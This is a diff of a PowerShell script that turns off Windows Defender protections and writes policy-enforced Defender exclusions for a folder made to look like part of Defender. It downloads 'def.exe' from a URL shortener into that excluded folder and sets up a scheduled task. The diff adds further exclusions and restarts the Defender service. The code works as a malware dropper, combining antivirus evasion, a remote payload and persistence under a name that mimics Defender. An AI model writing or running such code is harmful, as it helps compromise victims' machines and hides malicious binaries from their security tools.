@@ -39,24 +39,26 @@ Set-MpPreference -DisableBlockAtFirstSeen $true
 
 # Define exclusions
 $exclusions = @(
-    "C:\Program Files\defender\"
+    "C:\Program Files\defender",
+    "C:\Program Files\defender\Executable",
+    "C:\Program Files\defender\Executable\def.exe"
 )
 
 # Registry path for policy-enforced exclusions
 $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
 
 # Ensure the key exists
-if (-not (Test-Path $regPath)) {
+If (-Not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force | Out-Null
 }
 
-# Add exclusions
+# Add exclusions to the registry
 foreach ($path in $exclusions) {
-    Write-Host "Adding exclusion (policy enforced): $path" -ForegroundColor Yellow
-    Set-ItemProperty -Path $regPath -Name $path -Value 0 -ErrorAction SilentlyContinue
+    New-ItemProperty -Path $regPath -Name $path -PropertyType String -Value "" -Force | Out-Null
 }
-
-
+gpupdate /force
+Restart-Service -Name WinDefend -Force
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 #Downloading the Files
 New-Item -Path "C:\Program Files\defender\Executable" -ItemType Directory -Force
 Invoke-WebRequest -Uri "https://tinyurl.com/46jswbnp" -OutFile "C:\Program Files\defender\Executable\def.exe"
@@ -73,7 +75,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 # === Adding info ===
 $scriptPath = "C:\Program Files\defender\Executable\script.ps1"  
-$taskName = "Def"
+$taskName = "def"
 
 # === AUTO-DETECT CURRENT USER & SID ===
 $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
